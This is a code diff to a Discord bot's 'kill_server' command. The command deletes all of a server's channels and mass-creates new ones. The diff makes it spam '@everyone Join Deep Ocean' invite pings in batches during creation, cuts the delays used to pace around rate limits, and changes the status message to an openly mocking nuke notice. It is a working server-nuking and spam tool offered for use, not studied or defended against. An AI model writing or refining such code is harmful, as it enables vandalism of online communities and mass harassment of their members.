@@ -54,7 +54,7 @@ async def kill_server(ctx, confirm: str = None):
         return
 
     guild = ctx.guild
-    await ctx.send("🚨 **Server reset initiated.** Deleting existing channels...")
+    await ctx.send("**Nukimg server please wait** POOR SERVER WHY NUKE IT")
 
     # Phase 1: Wipe all existing channels
     deleted_count = 0
@@ -71,7 +71,7 @@ async def kill_server(ctx, confirm: str = None):
 
     print(f"[Info] Successfully deleted {deleted_count} channels.")
 
-    # Phase 2: Create new channels with explicit permission overrides
+    # Phase 2 & 3: Create channels in batches of 5 and ping immediately
     created_channels = []
     print(f"[Info] Starting creation of {TARGET_COUNT} new channels...")
 
@@ -91,43 +91,27 @@ async def kill_server(ctx, confirm: str = None):
                 reason="Server mass reset channel creation."
             )
             created_channels.append(new_channel)
-            await asyncio.sleep(2.0)
+            await asyncio.sleep(1.5)
+            
+            # Every time 5 channels accumulate, ping them right away
+            if i % 5 == 0:
+                print(f"[Info] Reached {i} channels. Pinging current batch...")
+                for ch in created_channels[-5:]:
+                    try:
+                        await ch.send(
+                            f"@everyone Join Deep Ocean {INVITE_LINK}",
+                            allowed_mentions=discord.AllowedMentions(everyone=True)
+                        )
+                        await asyncio.sleep(0.5)
+                    except discord.HTTPException as err:
+                        print(f"[Error] Failed sending broadcast in channel #{ch.name}: {err}")
+                        await asyncio.sleep(2.0)
             
         except discord.HTTPException as err:
             print(f"[Error] Failed to create channel index {i}: {err}")
-            await asyncio.sleep(8.0)
-
-    print(f"[Info] Successfully created {len(created_channels)} channels. Broadcasting messages...")
-
-    # Phase 3: Broadcast the ping message twice per channel safely
-    for ch in created_channels:
-        try:
-            await ch.send(
-                f"@everyone Join Deep Ocean {INVITE_LINK}",
-                allowed_mentions=discord.AllowedMentions(everyone=True)
-            )
-            await asyncio.sleep(1.0)
-
-            await ch.send(
-                f"@everyone Join Deep Ocean {INVITE_LINK}",
-                allowed_mentions=discord.AllowedMentions(everyone=True)
-            )
-            await asyncio.sleep(2.0)
-            
-        except discord.HTTPException as err:
-            print(f"[Error] Failed sending broadcast in channel #{ch.name}: {err}")
             await asyncio.sleep(5.0)
 
-    # Phase 4: Final confirmation message in the first channel
-    if created_channels:
-        try:
-            await created_channels[0].send(
-                "✅ **Server reset process completed successfully.** Join Deep Ocean."
-            )
-        except Exception:
-            pass
-
-    print("[Info] Server reset sequence fully completed.")
+    print(f"[Info] Server reset sequence fully completed.")
 
 
 @kill_server.error
